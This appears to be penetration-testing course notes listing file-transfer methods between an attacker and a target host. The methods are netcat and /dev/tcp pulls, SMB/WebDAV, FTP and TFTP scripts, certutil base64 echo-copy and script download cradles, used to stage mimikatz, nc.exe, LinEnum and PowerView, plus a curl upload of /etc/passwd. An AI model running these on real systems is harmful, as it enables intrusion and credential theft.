# HTTP/SMB/Nginx/Web Servers/Netcat

A good alternative for transferring files to `Apache` is [NGINX](https://www.nginx.com/resources/wiki/) because it is configuration is less complicated, and the module system does not lead to security issues like `Apache` can do.

### Nginx Enable PUT

```
# 1-Create a directory to handle uploaded files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2-Change the owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 3-Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents:

server {
	listen 9001;
	
	location /SecretUploadDirectory/ {
		root	/var/www/uploads;
		dav_methods	PUT;
	}
}

# 4-Symlink our site to the sites-enabled directory.
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Start Nginx
sudo systemctl restart nginx.service

# IF ANY ERROS OCCURS check /var/log/nginx/error.log
# if we see there is already a module listening on port 80 remove default nginx conf
sudo rm /etc/nginx/sites-enabled/default


# we can then test upload by using cuurl and put 
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
tail -1 /var/www/upload/SecretUploadDirectory/users.txt 

```

## SMB

**Impacket SMBServer**

```
/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <location>
#Test it 
sudo smbclient -L 127.0.0.1
```

In some cases, computers will not allow anonymous `SMB` connections. In this case, we may want to use the user/password flags to allow authentication on our `SMB` server. This can be done with the following command:

```
/usr/share/doc/python3-impacket/examples/smbserver.py -user USERNAME -password PASSWORD FileTransfer $(pwd)    
```

### SMB / WebDAV

In case SMB traffic through the firewall has been restricted, [WebDAV](https://en.wikipedia.org/wiki/WebDAV) may be a good option, as it relies on `HTTP` as a transport protocol.

```
#PowerShell
Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session

#Set-Content
$file = Get-Content C:\Temp\nc.exe -Raw
Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}

#Copy / xcopy / robocopy
xcopy \\10.10.10.132\share\nc.exe nc.exe
copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe

#Map / Mount Drives
net use Q: \\10.10.10.132\share
mklink /D share \\10.10.10.132\share
--------    
smbclient //10.10.10.132/share -U username -W domain
```

## Web Servers

```
#Python2
python -m SimpleHTTPServer 8080

#Python3
python3 -m http.server 8080

#Ruby
ruby -run -ehttpd . -p8080

#PHP
php -S 0.0.0.0:8080

#Socat
socat TCP-LISTEN:8080,reuseaddr,fork
#With administrative access to a Windows machine, IIS can be easily installed.
PS C:\> Add-WindowsFeature Web-Server, Web-Mgmt-Tools
```

## Netcat&#x20;

### Basic nc

**Connection Initiated by Pentester**

```
# VICTIM TARGET
nc -nlvp 8000 > mimikatz.exe

# ATTACKER MACHINE
nc -nv 10.10.10.132 8000 <mimikatz.exe
```

**Connection Initiated by Victim/TargeT**

```
# ATTACKER MACHINE
nc -nv 10.10.10.32 8000 > mimikatz.exe

# VICTIM
nc -nlvp 8000 <mimikatz.exe

```

### Using /dev/tcp device file

```
#Start listener
nc -lvnp 80 <LinEnum.sh
#Download the file
 cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh
```

## SCP

OpenSSH server can be enabled using this [procedure](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh\_install\_firstuse). On older Windows systems, the PuTTY Secure Copy client (pscp.exe) can be used.

```
#Upload
PS> scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
#Download
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

## FTP

**Ftp-script.txt**

```
open <IP>
anonymous
anonymous
lcd C:\Temp
get nc.exe
quit

```

#### FTP Transfer

```
ftp -s:ftp-script.txt
```

## TFTP

The TFTP client is not available by default in Windows, but it can be enabled using DISM. \\

```
PS C:\> DISM /online /Enable-Feature /FeatureName:TFTP
```

In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access.

```
PS C:\> Install-WindowsFeature TFTP-Client
```

## RDP

Remote Desktop is often enabled on Windows machines, and from Linux, `rdesktop` can be used to expose a local folder in the remote RDP session.

```
rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
```

After selecting the drive, we can interact with it in the remote session as follows:

```
copy \\tsclient\c\temp\mimikatz.exe .
```

### Echo Copy

On machines with a very stringent lockdown policy, it may be necessary to echo copy files.

Echo copying files is very inefficient and can result in a large amount of data being transferred across the clipboard, so we can use an executable packer such as [UPX](https://github.com/upx/upx/releases) to make the source file as small as possible.

```
upx --best nc.exe


c:\> upx.exe --best nc.exe
 Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     59392 ->     29696   50.00%    win32/pe     nc.exe                        

Packed 1 file.
```

Next, we need to convert the binary data to base64. Windows contains a native utility that can do this - certutil.

```
PS C:\> certutil.exe -encode nc.exe nc.txt
```

Open the resulting text file in a text editor that supports the replacement of extended characters (\n \r \t \0 \x...), such as Notepad++. Replace newlines with **echo "**.

```
Find:\n
Replace:echo "
```



The first line doesn’t contain this, so we can manually prepend **echo "** to the first line. Next, we replace  with **" >> nc.txt**.

FTP Transfer

```shell-session
Find:\r
Replace:" >> nc.txt
```

If the last line has an **echo "** on its own, remove it.

Next, copy all the text, and paste it into the shell, pressing enter if needed on the last command. This time, use the **-decode** certutil switch to convert the base64 text back to binary.

```
PS C:\htb> certutil.exe -decode nc.txt nc.exe
PS C:\htb> cmd /c "nc.exe -h 2>&1"
```

### OpenSSL base64



```
#Encryption
openssl.exe enc -base64 -in nc.exe -out nc.txt
#Decryption
openssl.exe enc -base64 -d -in nc.txt -out nc.exe
```

### JavaScript



The following JavaScript, based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, can be used.

Code: javascript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

It can be executed as follows.

Decryption

```
PS C:\htb> cscript /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

```
VBScript

The following VBScript, based on this post can be used.
Code: vbscript

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

It can be executed as follows.
Decryption

PS C:\htb> cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

```

